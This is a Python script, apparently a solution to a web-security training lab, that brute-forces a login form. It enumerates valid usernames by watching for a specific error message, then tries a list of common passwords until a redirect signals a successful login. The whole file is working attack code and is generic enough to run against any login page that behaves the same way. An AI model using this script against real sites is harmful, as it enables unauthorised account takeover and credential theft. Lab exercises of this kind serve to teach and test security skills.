import requests
import sys



def enumerate_username(url, session):
    usernames = [
        "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator", "oracle",
        "ftp", "pi", "puppet", "ansible", "ec2-user", "vagrant", "azureuser", "academico", "acceso", "access",
        "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin", "administracion",
        "administrador", "administrator", "administrators", "admins", "ads", "adserver", "adsl", "ae", "af",
        "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai",
        "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo", "americas",
        "an", "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao", "ap", "apache", "apollo",
        "app", "app01", "app1", "apple", "application", "applications", "apps", "appserver", "aq", "ar", "archie",
        "arcsight", "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia", "asterix", "at",
        "athena", "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto", "autodiscover"
    ]
    for i in range(len(usernames)):
        response = session.post(f"{url}/login", data={"username": usernames[i], "password": "pass"}, timeout=10)
        if "Invalid username or password." not in response.text:
            return usernames[i]


def enumerate_password(url, session, username):
    passwords = [
        "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon",
        "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop",
        "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000",
        "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
        "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas",
        "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica",
        "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",
        "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
        "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix",
        "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"
    ]
    for i in range(0, len(passwords)):
        response = session.post(f"{url}/login", data={"username": username, "password": passwords[i]}, allow_redirects=False, timeout=10)
        if response.status_code == 302:
            return passwords[i]

def login(url, session, username, password):
    response = session.post(f"{url}/login", data={"username": username, "password": password}, timeout=10)
    return f"Your username is: {username}" in response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Enumerating username....")
        username = enumerate_username(url, session)
        if username:
            print(f"(+) Username found: {username}")
        else:
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        print("(+) Enumerating password...")
        password = enumerate_password(url, session, username)
        if password:
            print(f"(+) Password found: {password}")
        else:
            print("(-) Something went wrong.")
            sys.exit(1)

        print(f"(+) Logging in...")
        if login(url, session, username, password):
            print("(+) Lab successfully solved!")
        else:
            print("(-) Something went wrong.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()
